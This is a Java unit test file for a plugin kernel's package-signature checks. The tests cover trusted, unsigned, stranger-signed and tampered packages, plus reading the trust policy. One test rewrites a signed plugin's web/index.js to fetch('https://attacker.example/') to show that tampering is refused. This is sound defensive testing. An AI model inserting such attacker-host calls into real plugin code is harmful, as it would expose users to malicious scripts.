// SPDX-FileCopyrightText: 2026 Massimo Antonini
// SPDX-License-Identifier: MPL-2.0
package dev.mosaikit.kernel.core.plugin;

import static java.nio.charset.StandardCharsets.UTF_8;
import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import dev.mosaikit.kernel.api.signature.PackageSignatures;
import dev.mosaikit.kernel.api.signature.SigningKeys;
import dev.mosaikit.kernel.api.version.Version;
import java.io.IOException;
import java.io.InputStream;
import java.io.UncheckedIOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.KeyPair;
import java.util.List;
import java.util.Map;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import java.util.zip.ZipOutputStream;
import org.junit.jupiter.api.Tag;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

/** The kernel and the launcher accept, mark or refuse plugins by their signature (MK-013). */
@Tag("MK-013")
class SignedPackagesTest {

    private static final KeyPair PUBLISHER = SigningKeys.generate();
    private static final KeyPair STRANGER = SigningKeys.generate();
    private static final Version KERNEL = Version.parse("0.3.0");
    private static final String MANIFEST = """
            id: dev.example.hello
            version: 1.0.0
            name: Hello
            kind: [app]
            platform: '>=0.1 <1'
            frontend:
              entry: web/index.js
            """;

    @TempDir
    Path plugins;

    @TempDir
    Path work;

    @Test
    void marksThePublisherOfAPackageSignedWithATrustedKey() throws IOException {
        PackageSignatures.sign(zip("hello-1.0.0.zip"), PUBLISHER);

        assertThat(scan(trust(false))).singleElement().satisfies(plugin -> {
            assertThat(plugin.status()).isEqualTo(PluginStatus.ACTIVE);
            assertThat(plugin.isVerified()).isTrue();
            assertThat(plugin.publisherKey()).contains(SigningKeys.keyId(PUBLISHER.getPublic()));
        });
    }

    @Test
    void acceptsUnsignedPluginsWhenSignaturesAreOptional() throws IOException {
        zip("hello-1.0.0.zip");

        assertThat(scan(trust(false))).singleElement().satisfies(plugin -> {
            assertThat(plugin.status()).isEqualTo(PluginStatus.ACTIVE);
            assertThat(plugin.isVerified()).isFalse();
        });
    }

    @Test
    void refusesAPackageChangedAfterSigning() throws IOException {
        Path zip = zip("hello-1.0.0.zip");
        PackageSignatures.sign(zip, PUBLISHER);
        replace(zip, "web/index.js", "fetch('https://attacker.example/');");

        assertThat(scan(trust(false))).singleElement().satisfies(plugin -> {
            assertThat(plugin.status()).isEqualTo(PluginStatus.INVALID);
            assertThat(plugin.problems())
                    .singleElement()
                    .asString()
                    .startsWith("Refused package:")
                    .contains("web/index.js");
        });
        assertThat(work.resolve("hello-1.0.0")).doesNotExist();
    }

    @Test
    void refusesUnsignedAndUnknownPackagesAndDirectoriesWhenSignaturesAreRequired() throws IOException {
        zip("unsigned.zip");
        PackageSignatures.sign(zip("stranger.zip"), STRANGER);
        Files.createDirectories(plugins.resolve("directory"));
        Files.writeString(plugins.resolve("directory/manifest.yaml"), MANIFEST);

        assertThat(scan(trust(true)))
                .allSatisfy(plugin -> assertThat(plugin.status()).isEqualTo(PluginStatus.INVALID))
                .flatExtracting(InstalledPlugin::problems)
                .anySatisfy(problem -> assertThat(problem).contains("not signed"))
                .anySatisfy(problem -> assertThat(problem).contains("not trusted"))
                .anySatisfy(problem -> assertThat(problem).contains("not directories"));
    }

    @Test
    void acceptsOnlyTrustedPackagesWhenSignaturesAreRequired() throws IOException {
        PackageSignatures.sign(zip("hello-1.0.0.zip"), PUBLISHER);

        assertThat(scan(trust(true))).singleElement().satisfies(plugin -> {
            assertThat(plugin.isActive()).isTrue();
            assertThat(plugin.isVerified()).isTrue();
        });
    }

    @Test
    void readsTheTrustedKeysAndThePolicy() throws IOException {
        Path keys = work.resolve("keys");
        SigningKeys.write(PUBLISHER, keys, "publisher");

        assertThat(PackageTrust.read(keys, "Required"))
                .satisfies(trust -> assertThat(trust.signaturesRequired()).isTrue())
                .satisfies(trust ->
                        assertThat(trust.trustedKeys()).containsOnlyKeys(SigningKeys.keyId(PUBLISHER.getPublic())));
        assertThat(PackageTrust.read(work.resolve("missing"), " ").signaturesRequired())
                .isFalse();
        assertThat(PackageTrust.read(keys, null).signaturesRequired()).isFalse();
        assertThat(PackageTrust.none().trustedKeys()).isEmpty();
        assertThatThrownBy(() -> PackageTrust.read(keys, "sometimes"))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessageContaining("'required' or 'optional'");
        Files.writeString(keys.resolve("broken.pub.pem"), "not a key");
        assertThatThrownBy(() -> PackageTrust.read(keys, "optional")).isInstanceOf(UncheckedIOException.class);
    }

    private List<InstalledPlugin> scan(PackageTrust trust) {
        return new PluginCatalog(KERNEL, BackendCheck.jarExists(), trust).scan(plugins, work);
    }

    private static PackageTrust trust(boolean required) {
        return new PackageTrust(Map.of(SigningKeys.keyId(PUBLISHER.getPublic()), PUBLISHER.getPublic()), required);
    }

    private Path zip(String name) throws IOException {
        Path zip = plugins.resolve(name);
        try (var out = new ZipOutputStream(Files.newOutputStream(zip))) {
            out.putNextEntry(new ZipEntry("manifest.yaml"));
            out.write(MANIFEST.replace("dev.example.hello", "dev.example." + name.replaceAll("[^a-z]", ""))
                    .getBytes(UTF_8));
            out.closeEntry();
            out.putNextEntry(new ZipEntry("web/index.js"));
            out.write("export default {};".getBytes(UTF_8));
            out.closeEntry();
        }
        return zip;
    }

    /** Rewrites a package with another content for one entry, keeping its signature files. */
    private static void replace(Path zip, String name, String content) throws IOException {
        Path copy = zip.resolveSibling("copy.tmp");
        try (var in = new ZipFile(zip.toFile());
                var out = new ZipOutputStream(Files.newOutputStream(copy))) {
            var entries = in.entries();
            while (entries.hasMoreElements()) {
                ZipEntry entry = entries.nextElement();
                out.putNextEntry(new ZipEntry(entry.getName()));
                if (entry.getName().equals(name)) {
                    out.write(content.getBytes(UTF_8));
                } else {
                    try (InputStream data = in.getInputStream(entry)) {
                        data.transferTo(out);
                    }
                }
                out.closeEntry();
            }
        }
        Files.move(copy, zip, java.nio.file.StandardCopyOption.REPLACE_EXISTING);
    }
}
